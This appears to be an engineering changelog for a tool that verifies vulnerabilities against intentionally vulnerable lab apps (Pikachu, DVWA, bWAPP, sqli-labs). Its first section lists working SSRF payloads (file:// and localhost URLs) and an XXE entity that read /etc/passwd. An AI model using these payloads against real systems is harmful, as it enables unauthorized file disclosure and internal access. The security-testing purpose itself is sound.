# SOP v1.7 — SSRF/XXE Validation + VuleSandboxBridge Integration
Date: 2026-06-11

## 1. SSRF/XXE PoC Validation (Pikachu)

### SSRF via curl_exec()
- `ssrf_curl.php?url=http://127.0.0.1/server-status` — Apache metadata exposed ✅
- `ssrf_curl.php?url=file:///etc/passwd` — Local file read via file:// protocol ✅

### SSRF via file_get_contents()
- `ssrf_fgc.php?file=/etc/passwd` — Arbitrary file read ✅

### XXE (External Entity Injection)
- `xxe_1.php` POST with `<!ENTITY xxe SYSTEM "file:///etc/passwd">` — /etc/passwd disclosure ✅

**Result: 4/4 SSRF+XXE PoCs verified against Pikachu**

## 2. VuleSandboxBridge

### Architecture
```
PocSandbox.execute() → PocResult
                          ↓
VuleSandboxBridge.verifyPayload() → VulnerabilityVerification
                          ↓
UVRS.compute({ verify, consensus }) → UVRSResult { score, level }
```

### Key Components
- `VuleSandboxBridge` class (`src/poc/vule-sandbox-bridge.ts`):
  - Manages one PocSandbox per target
  - Runs PoCs from payload database, aggregates results
  - Maps verification confidence to UVRS `verify` dimension
  - Multi-hit bonus (+5% per success, cap 15%) for repeated confirmations
  - Cross-target bonus (+10%) for same vuln across different targets
  - Generates BridgeReport with UVRS risk distribution

- `VulnerabilityVerification` interface: id, vulnType, target, results[], verified, confidence, attempts, successes, bestResult

- `reportToMarkdown()` — generates markdown report with summary + per-type stats + verified PoC table

- 17 unit tests (all passing): constructor, empty report, DEFAULT_VERIFY_MAPPER logic (base confidence, multi-hit, cross-target, cap), UVRS integration (verified > unverified), markdown generation, payload database coverage

### Bug Fix
- `payload-database.ts` line 47: `_level` → `level` (variable shadowing prevented DVWA entries from loading)

## 3. Test Results
- **956 unit tests passing** (was 939 with 50 poc tests, now +17 bridge tests)
- **0 failures** across 95 files

## 4. Aggregate PoC Scorecard

| Target       | PoCs | Pass | Rate  | Vuln Types                                    |
|-------------|------|------|-------|-----------------------------------------------|
| DVWA        | 21   | 21   | 100%  | SQLi, Blind SQLi, XSS-R, XSS-S, RCE, LFI, Upload |
| bWAPP       | 19   | 16   | 84%   | SQLi, XSS, RCE, LFI (3 unbreakable)          |
| sqli-labs   | 66   | 66   | 100%  | Error/Blind/Header/Cookie/Filter-bypass SQLi  |
| Pikachu     | 17   | 17   | 100%  | SQLi, XSS, RCE, LFI, CSRF, SSRF, XXE         |
| **Total**   | 123  | 120  | **98%** | 0 false positives, 3 unbreakable            |

## 5. Files Changed
- `src/poc/vule-sandbox-bridge.ts` — NEW: bridge module (VuleSandboxBridge, VulnerabilityVerification, reportToMarkdown)
- `tests/unit/poc/vule-sandbox-bridge.test.ts` — NEW: 17 unit tests
- `src/poc/payload-database.ts` — FIX: `_level` → `level` in DVWA flatMap
